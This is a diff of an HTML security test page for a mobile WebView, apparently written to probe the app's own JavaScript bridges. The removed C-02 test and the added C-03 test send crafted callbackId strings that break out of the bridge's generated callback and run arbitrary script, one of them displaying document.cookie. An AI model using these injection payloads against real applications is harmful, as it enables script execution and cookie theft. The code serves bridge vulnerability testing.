@@ -82,43 +82,43 @@
   <h2>Embedded Website</h2>
 <div style="max-width: 1000px; margin: 20px auto;">
 
-  <hr>
-<h2 style="color:red;">SECURITY TESTS</h2>
+  <div class="settings-section" style="border-color:red;">
+  <h3 style="color:red;">C-03: Custom Bridge Raw JS Injection</h3>
+  <p>Sends a crafted <code>callbackId</code> to the <code>CUSTOMTEST</code> bridge.
+  The bridge builds <code>callbackId(response)</code> and executes it verbatim.
+  Injected payload breaks out and runs arbitrary JS.</p>
 
-<div class="settings-section" style="border-color:red;">
-  <h3 style="color:red;">C-02: JS Injection — Backslash Escape Bypass</h3>
-  <p>Sends a malicious <code>callbackId</code> with a backslash to the location bridge.
-  The SDK escapes <code>'</code> but NOT <code>\</code>, so the string breaks out.</p>
-
-  <p><b>Payload:</b> <code>\'; alert("C02_INJECTED: "+document.cookie); //</code></p>
-
-  <button class="btn" onclick="testC02_backslashInjection()">Test C-02: Backslash Injection</button>
-  <button class="btn" onclick="testC02_newlineInjection()">Test C-02: Newline Injection</button>
-  <div class="status-box" id="c02Status">—</div>
+  <button class="btn" onclick="testC03_titleProbe()">Test C-03: Change document.title</button>
+  <button class="btn" onclick="testC03_cookieExfil()">Test C-03: Alert Cookies</button>
+  <div class="status-box" id="c03Status">—</div>
 </div>
 
 <script>
-  // C-02 Test A — backslash escape bypass
-  // The callbackId \'; alert(...); // after SDK escaping becomes:
-  //   '\\'  → closes the string, then alert() executes freely
-  function testC02_backslashInjection() {
-    document.getElementById('c02Status').textContent = 'Sent. Watch for alert() popup — if it fires, injection is confirmed.';
-    const maliciousCallbackId = "\\'; alert('C02_INJECTED: ' + document.cookie); //";
-    window.webkit.messageHandlers.getCurrentLocation.postMessage({
-      "scriptName": "getCurrentLocation",
-      "callbackId": maliciousCallbackId
+  // C-03 Test A — change document.title to confirm injection
+  // If title changes to "PWNED", the custom bridge has no JS sanitisation
+  function testC03_titleProbe() {
+    window.webkit.messageHandlers.CUSTOMTEST.postMessage({
+      "scriptName": "CUSTOMTEST",
+      "callbackId": "injected); document.title='C03_PWNED'; (",
+      "data": {}
     });
+    setTimeout(() => {
+      const status = document.title === 'C03_PWNED'
+        ? '⚠️ CONFIRMED: title changed — C-03 injection works!'
+        : 'Title is: ' + document.title + ' (may need to wait or check bridge name)';
+      document.getElementById('c03Status').textContent = status;
+    }, 500);
   }
 
-  // C-02 Test B — raw newline injection
-  // The \n breaks out of the JS string literal
-  function testC02_newlineInjection() {
-    document.getElementById('c02Status').textContent = 'Sent. Watch for alert() — if it fires, newline injection confirmed.';
-    const newlinePayload = "legit_id\n'; alert('C02_NEWLINE_INJECTED'); //";
-    window.webkit.messageHandlers.getCurrentLocation.postMessage({
-      "scriptName": "getCurrentLocation",
-      "callbackId": newlinePayload
+  // C-03 Test B — exfiltrate cookies via the custom bridge callback injection
+  function testC03_cookieExfil() {
+    const payload = "x); alert('C03_COOKIES: ' + document.cookie); (";
+    window.webkit.messageHandlers.CUSTOMTEST.postMessage({
+      "scriptName": "CUSTOMTEST",
+      "callbackId": payload,
+      "data": {}
     });
+    document.getElementById('c03Status').textContent = 'Sent. If alert fires with cookies, C-03 is confirmed.';
   }
 </script>
 
